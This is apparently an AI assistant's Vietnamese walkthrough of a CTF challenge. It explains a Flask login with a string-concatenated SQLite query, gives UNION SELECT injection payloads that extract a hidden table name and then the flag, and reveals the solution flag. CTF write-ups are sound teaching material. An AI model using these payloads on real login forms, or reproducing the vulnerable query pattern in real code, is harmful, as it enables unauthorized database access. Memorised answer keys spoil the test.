Chào bạn, mình sẽ giúp bạn giải bài CTF này. Đây là một bài tấn công **SQL Injection** kinh điển.

### Phân tích lỗ hổng (Vulnerability Analysis)

Điểm mấu chốt của bài này nằm ở hàm `login`:

```python
@app.route("/", methods=["GET", "POST"])
def login():
    # ...
    username = request.form["username"]
    password = request.form["password"]

    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    # Lỗ hổng SQL Injection nằm ở đây!
    c.execute("SELECT username FROM users WHERE username='" + username + "' AND password='" + password + "'")
    user = c.fetchone()
    # ...
```

Dòng `c.execute(...)` ghép thẳng chuỗi `username` và `password` người dùng nhập vào câu truy vấn SQL. Kẻ tấn công có thể chèn các mã SQL độc hại vào ô username/password để thay đổi logic của câu truy vấn.

Mục tiêu của chúng ta là lấy được `flag`. Nhìn vào hàm `init_db()`, ta thấy flag được lưu trong một bảng có tên được tạo ngẫu nhiên:

```python
def init_db():
    # ...
    # Tên bảng được tạo ngẫu nhiên, dài 101 ký tự và luôn bắt đầu bằng 'a'
    randomstring = 'a' + ''.join(random.choice(characters) for _ in range(100))
    c.execute("CREATE TABLE IF NOT EXISTS " + randomstring + " (flag TEXT)")
    c.execute("INSERT INTO " + randomstring + " (flag) VALUES ('" + flag + "')")
    # ...
```

Vậy, kế hoạch tấn công của chúng ta sẽ gồm 2 bước:
1.  Dùng SQL Injection để tìm ra tên của bảng bí mật chứa flag.
2.  Dùng SQL Injection một lần nữa để đọc nội dung cột `flag` từ bảng đó.

### Kế hoạch tấn công (Step-by-step Exploit)

Chúng ta sẽ sử dụng kỹ thuật `UNION SELECT` để trích xuất dữ liệu.

#### Bước 1: Tìm tên bảng bí mật

Trong SQLite, có một bảng đặc biệt tên là `sqlite_master` chứa thông tin về tất cả các bảng trong database. Chúng ta có thể truy vấn bảng này để lấy tên các bảng khác.

Payload của chúng ta sẽ được nhập vào ô **Username**. Ô Password có thể nhập bất cứ thứ gì.

**Payload để tìm tên bảng:**
```sql
' UNION SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'a%' -- 
```

**Giải thích payload:**
*   `'` : Để đóng chuỗi `username='...'` trong câu truy vấn gốc.
*   `UNION SELECT name FROM sqlite_master`: Kết hợp kết quả của câu truy vấn gốc với một câu truy vấn mới. Câu truy vấn mới này chọn cột `name` (tên bảng) từ `sqlite_master`.
*   `WHERE type='table' AND name LIKE 'a%'`: Lọc để chỉ lấy các bảng (không phải index) và có tên bắt đầu bằng chữ 'a' (dựa theo code `init_db`).
*   `-- `: (dấu cách sau 2 dấu gạch ngang là quan trọng) Dùng để biến phần còn lại của câu truy vấn gốc (`AND password=...`) thành một comment, vô hiệu hóa nó.

**Thực hiện:**
1.  Vào trang Login (`/`).
2.  Trong ô **Username**, nhập payload trên: `' UNION SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'a%' -- `
3.  Trong ô **Password**, nhập bất cứ thứ gì (ví dụ: `123`).
4.  Nhấn Login.

**Kết quả:**
Bạn sẽ được chuyển hướng đến trang chủ và thấy dòng chào mừng. Thay vì tên người dùng, bạn sẽ thấy tên của bảng bí mật. Ví dụ:
`Welcome, aS7fG... (một chuỗi dài 101 ký tự)!`

Hãy sao chép (copy) lại cái tên bảng này.

#### Bước 2: Lấy flag từ bảng đã tìm được

Bây giờ chúng ta đã có tên bảng, chúng ta sẽ thực hiện một cuộc tấn công `UNION SELECT` khác để đọc cột `flag` từ bảng đó.

**Payload để lấy flag:**
```sql
' UNION SELECT flag FROM [Tên-Bảng-Vừa-Tìm-Được] -- 
```

**Thực hiện:**
1.  Quay lại trang Login (bạn có thể vào `/logout` trước).
2.  Trong ô **Username**, nhập payload trên. **Nhớ thay `[Tên-Bảng-Vừa-Tìm-Được]` bằng cái tên bạn lấy được ở Bước 1.**
    *   Ví dụ, nếu tên bảng là `aS7fG...xyz`, payload sẽ là: `' UNION SELECT flag FROM aS7fG...xyz -- `
3.  Trong ô **Password**, nhập bất cứ thứ gì.
4.  Nhấn Login.

**Kết quả:**
Bạn sẽ được chuyển hướng đến trang chủ một lần nữa. Lần này, dòng chào mừng sẽ chứa chính flag bạn cần tìm!
`Welcome, LITCTF{w04h_sQl?_l0v3_to_S3e_iT}!`

### Tóm tắt

1.  **Lấy tên bảng:**
    *   Username: `' UNION SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'a%' -- `
    *   Password: `a`
2.  **Lấy flag:**
    *   Username: `' UNION SELECT flag FROM aoDB5IKbkGS4Je9Aswp0zmrFPPy5HGZezrjjBCSkBjUvdukdzgeJ7IIcEaRDyW9gNwWH4q5Cfu6PFCl1FA9PemS1U61kjk84jlHry -- `
    *   Password: `a`